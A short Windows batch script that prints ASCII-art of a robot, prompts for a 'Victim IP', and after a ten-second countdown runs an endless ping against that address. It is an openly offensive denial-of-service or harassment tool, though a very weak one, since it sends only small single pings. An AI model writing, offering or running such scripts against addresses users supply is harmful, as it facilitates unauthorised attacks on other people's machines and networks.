@echo off

echo                                    *////(                                      
echo                                *//      ,//                                   
echo                               ,/,         //                                  
echo                               */,         //                                  
echo                                ///      .//                                   
echo                                   //////*                                     
echo                                     //.                                       
echo                                     //.                                       
echo                                     //.                                       
echo                            .*/////////////////,                               
echo                       ////*.                   ,////,                         
echo                   ///*                              .///,                     
echo                *//.                                     *//.                  
echo  ,/////      //*                                           //*     ,/////     
echo */.   //   //*                                               //.  */.   //    
echo */.   */  //                                                  .// */    //    
echo */.   */,//                                                     //*/    //    
echo */.   *///        .////////////////////////////////////*         ///    //    
echo */.   *//       ///                                     //,      ,//    //    
echo */.   */*      //     **.                         **.     //      //    //    
echo */.   */      (/.   //*,//                      */*,//    //.     //    //    
echo */.   */      ./*    *///.                       *///.    //      */    //    
echo */.   */       .//                                      ,//       */    //    
echo */.   */          /////*****************************////*         */    //    
echo */,   //                                                          */.   //    
echo   (/////                                                          *//////     
echo       */                                                          */          
echo       */.                                                         //          
echo         /////.                                               ,////.           
echo               ,(/////////,.                     .*//////////.                 
echo                              .,*/(((((((((/*.        
                                                                                                        




color 4
set /p ip=Enter Victim IP:
echo Victim IP : %ip%
color b
cls
echo -------------------------------------
echo Pinger Beginns in 10 seconds
echo -------------------------------------
Timeout 10 > null
cls
color a
ping -t %ip% -l 32
